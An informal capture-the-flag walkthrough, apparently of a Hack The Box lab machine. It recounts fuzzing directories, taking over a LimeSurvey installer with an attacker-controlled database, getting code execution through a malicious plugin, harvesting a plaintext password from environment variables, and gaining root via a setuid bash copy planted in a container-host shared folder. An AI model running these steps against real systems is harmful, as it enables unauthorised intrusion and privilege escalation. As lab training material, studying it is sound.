ports 22 and 80 are open

### port 80 is getting 403 forbidden
```
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.56
```

let's try to fuzz directories!!
`
└─$ gobuster dir -u http://10.129.234.81 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
`
```
survey               (Status: 301) [Size: 315] [--> http://10.129.234.81/survey/]
```



`http://10.129.234.81/survey/index.php?r=installer/welcome`
maybe lfi? or known CVEs?

The version of LimeSurvey running on the server is LimeSurvey 6.3.7
`/survey/index.php?r=installer/database`
it's asking us to configure the database, however there isnt a single database running on this server. Let's create one and connect the website to our db.

using Docker to make our mysql db
`└─$ docker run --name mysql-cont -e MYSQL_ROOT_PASSWORD=r00Tp@ssw0rd -e MYSQL_USER=htbuser -e MYSQL_PASSWORD=us3rp@ssw0rd -e MYSQL_DATABASE=limesurvey -p 3306:3306 -d mysql:latest`

getting rce from uploading a malicious plugin
INE has a nice article about this RCE, but I've done this manually.
`[link](https://ine.com/blog/cve-2021-44967-limesurvey-rce)`

## Env escape
```
$ env
APACHE_CONFDIR=/etc/apache2
HOSTNAME=efaa6f5097ed
PHP_INI_DIR=/usr/local/etc/php
LIMESURVEY_ADMIN=limesvc
SHLVL=0
OLDPWD=/home
PHP_LDFLAGS=-Wl,-O1 -pie
APACHE_RUN_DIR=/var/run/apache2
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=8.0.30
APACHE_PID_FILE=/var/run/apache2/apache2.pid
GPG_KEYS=1729F83938DA44E27BA0F4D3DBDB397470D12172 BFDDD28642824F8118EF77909B67A5C12229118F 2C16C765DBE54A088130F1BC4B9B5F600B55F3B4 39B641343D8C104B2B146DC3F9C39DC0B9698544
PHP_ASC_URL=https://www.php.net/distributions/php-8.0.30.tar.xz.asc
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_URL=https://www.php.net/distributions/php-8.0.30.tar.xz
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_GROUP=limesvc
APACHE_RUN_USER=limesvc
APACHE_LOG_DIR=/var/log/apache2
LIMESURVEY_PASS=5W5HN4K4GCXf9E
PWD=/
PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		                                                   libc-dev 		make 		pkg-config 		re2c
PHP_SHA256=216ab305737a5d392107112d618a755dc5df42058226f1670e9db90e77d777d9
APACHE_ENVVARS=/etc/apache2/envvars
```
but first, let's check out sudo privs
```
$ sudo -l
Matching Defaults entries for limesvc on efaa6f5097ed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User limesvc may run the following commands on efaa6f5097ed:
    (ALL : ALL) ALL
```

use this creds for ssh and for webshell user!
`limesvc:5W5HN4K4GCXf9E`

# User flag
`8c5aaea900d8c00c16a89c8ed699eb85`

the webshell user can write files into /opt/limesurvey/survey/ on our ssh host -> suid abuse?/host share abuse?
webhost:
```
cp /bin/bash message
chmod 6777 message
ls -l
total 1364
-rw-rw-r--   1 limesvc limesvc   49474 Nov 27  2023 LICENSE
-rw-rw-r--   1 limesvc limesvc    2488 Nov 27  2023 README.md
-rw-rw-r--   1 limesvc limesvc     536 Nov 27  2023 SECURITY.md
drwxr-xr-x   2 limesvc limesvc    4096 Nov 27  2023 admin
drwxr-xr-x  15 limesvc limesvc    4096 Nov 27  2023 application
drwxr-xr-x  10 limesvc limesvc    4096 Nov 27  2023 assets
drwxr-xr-x   7 limesvc limesvc    4096 Nov 27  2023 docs
-rw-rw-r--   1 limesvc limesvc    8154 Nov 27  2023 gulpfile.js
-rw-rw-r--   1 limesvc limesvc    5564 Nov 27  2023 index.php
drwxr-xr-x   4 limesvc limesvc    4096 Nov 27  2023 installer
drwxr-xr-x 120 limesvc limesvc    4096 Nov 27  2023 locale
-rwsrwsrwx   1 root    root    1234376 Jun  6 00:22 message
drwxr-xr-x   4 limesvc limesvc    4096 Nov 27  2023 modules
drwxr-xr-x  23 limesvc limesvc    4096 Nov 27  2023 node_modules
-rwxrwxr-x   1 limesvc limesvc    9672 Nov 27  2023 open-api-gen.php
drwxr-xr-x   3 limesvc limesvc    4096 Nov 27  2023 plugins
-rw-rw-r--   1 limesvc limesvc    2175 Nov 27  2023 psalm-all.xml
-rw-rw-r--   1 limesvc limesvc    1090 Nov 27  2023 psalm-strict.xml
-rw-rw-r--   1 limesvc limesvc    1074 Nov 27  2023 psalm.xml
-rw-rw-r--   1 limesvc limesvc    1684 Nov 27  2023 setdebug.php
drwxr-xr-x   5 limesvc limesvc    4096 Nov 27  2023 themes
drwxr-xr-x   6 limesvc limesvc    4096 Jun  5 23:37 tmp
drwxr-xr-x   9 limesvc limesvc    4096 Nov 27  2023 upload
drwxr-xr-x  36 limesvc limesvc    4096 Nov 27  2023 vendor
```

ssh user:
```
-rwsrwsrwx   1 root    root    1234376 Jun  6 00:22 message
drwxr-xr-x   4 limesvc limesvc    4096 Nov 27  2023 modules
drwxr-xr-x  23 limesvc limesvc    4096 Nov 27  2023 node_modules
-rwxrwxr-x   1 limesvc limesvc    9672 Nov 27  2023 open-api-gen.php
drwxr-xr-x   3 limesvc limesvc    4096 Nov 27  2023 plugins
-rw-rw-r--   1 limesvc limesvc    2175 Nov 27  2023 psalm-all.xml
-rw-rw-r--   1 limesvc limesvc    1090 Nov 27  2023 psalm-strict.xml
-rw-rw-r--   1 limesvc limesvc    1074 Nov 27  2023 psalm.xml
-rw-rw-r--   1 limesvc limesvc    1684 Nov 27  2023 setdebug.php
drwxr-xr-x   5 limesvc limesvc    4096 Nov 27  2023 themes
drwxr-xr-x   6 limesvc limesvc    4096 Jun  5 23:37 tmp
drwxr-xr-x   9 limesvc limesvc    4096 Nov 27  2023 upload
drwxr-xr-x  36 limesvc limesvc    4096 Nov 27  2023 vendor
limesvc@forgotten:/opt/limesurvey$
```

# root
```
limesvc@forgotten:/opt/limesurvey$ ./message -p
message-5.1# id
uid=2000(limesvc) gid=2000(limesvc) euid=0(root) egid=0(root) groups=0(root),2000(limesvc)
message-5.1# cat /root/root.txt
01fce13d2ffa2a7a41fcecb03656a00c
message-5.1#
```
